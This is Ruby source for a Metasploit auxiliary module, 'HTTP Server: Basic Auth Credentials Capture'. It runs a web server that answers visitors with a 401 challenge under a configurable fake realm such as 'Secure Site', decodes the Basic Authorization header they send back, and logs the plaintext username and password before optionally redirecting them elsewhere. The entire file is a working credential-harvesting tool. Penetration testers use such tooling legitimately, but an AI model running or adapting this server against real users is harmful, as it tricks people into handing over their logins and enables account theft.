class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpServer::HTML
def initialize(info={})
    super(update_info(info,
        'Name' => 'HTTP Server: Basic Auth Credentials Capture',
        'Description' => %q{
        Prompt browser to request credentials via a 401 response.
        },
    ))
    register_options([
        OptString.new('REALM', [ true, "Authentication realm attribute to use.", "Secure Site" ]),
        OptString.new('redirURL', [ false, "Redirect destination after sending credentials." ])
    ])
end
def run
    @myhost = datastore['SRVHOST']
    @myport = datastore['SRVPORT']
    @realm = datastore['REALM']
    print_status("Listening for connections on #{datastore['SRVHOST']}:#{datastore['SRVPORT']}...")
    exploit
end
def on_request_uri(cli, req)
    if(req['Authorization'] and req['Authorization'] =~ /basic/i)
        basic,auth = req['Authorization'].split(/\s+/)
        user,pass = Rex::Text.decode_base64(auth).split(':', 2)
        print_good("#{cli.peerhost} - Login captured! \"#{user}:#{pass}\" ")
        if datastore['redirURL']
            print_status("Redirecting client #{cli.peerhost} to #{datastore['redirURL']}")
            send_redirect(cli, datastore['redirURL'])
        else
            send_not_found(cli)
        end
    else
        print_status("We have a hit! Sending code 401 to client #{cli.peerhost} now... ")
        response = create_response(401, "Unauthorized")
        response.headers['WWW-Authenticate'] = "Basic realm=\"#{@realm}\""
        cli.send_response(response)
    end
end
end
